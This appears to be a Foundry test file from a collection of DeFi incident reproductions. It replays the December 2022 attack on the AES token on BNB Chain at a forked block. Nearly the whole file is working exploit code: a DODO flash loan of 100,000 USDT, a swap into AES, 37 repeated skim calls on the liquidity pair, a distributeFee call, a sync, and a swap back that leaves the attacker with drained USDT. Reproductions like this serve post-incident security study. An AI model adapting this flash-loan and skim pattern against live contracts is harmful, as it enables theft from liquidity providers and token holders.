// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @Analysis
// https://twitter.com/BlockSecTeam/status/1600442137811689473
// https://twitter.com/peckshield/status/1600418002163625984
// @TX
// https://bscscan.com/tx/0xca4d0d24aa448329b7d4eb81be653224a59e7b081fc7a1c9aad59c5a38d0ae19

interface IAES is IERC20 {
    function distributeFee() external;
}

contract ContractTest is Test {
    IAES AES = IAES(0xdDc0CFF76bcC0ee14c3e73aF630C029fe020F907);
    IERC20 USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
    Uni_Pair_V2 Pair = Uni_Pair_V2(0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3);
    Uni_Router_V2 Router = Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    address dodo = 0x9ad32e3054268B849b84a8dBcC7c8f7c52E4e69A;

    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function setUp() public {
        cheats.createSelectFork("bsc", 23_695_904);
    }

    function testExploit() public {
        USDT.approve(address(Router), type(uint256).max);
        AES.approve(address(Router), type(uint256).max);
        DVM(dodo).flashLoan(0, 100_000 * 1e18, address(this), new bytes(1));

        emit log_named_decimal_uint("[End] Attacker USDT balance after exploit", USDT.balanceOf(address(this)), 18);
    }

    function DPPFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external {
        USDTToAES();
        AES.transfer(address(Pair), AES.balanceOf(address(this)) / 2);
        for (uint256 i = 0; i < 37; i++) {
            Pair.skim(address(Pair));
        }
        Pair.skim(address(this));
        AES.distributeFee();
        Pair.sync();
        AESToUSDT();
        USDT.transfer(dodo, 100_000 * 1e18);
    }

    function USDTToAES() internal {
        address[] memory path = new address[](2);
        path[0] = address(USDT);
        path[1] = address(AES);
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            100_000 * 1e18, 0, path, address(this), block.timestamp
        );
    }

    function AESToUSDT() internal {
        address[] memory path = new address[](2);
        path[0] = address(AES);
        path[1] = address(USDT);
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            AES.balanceOf(address(this)), 0, path, address(this), block.timestamp
        );
    }
}
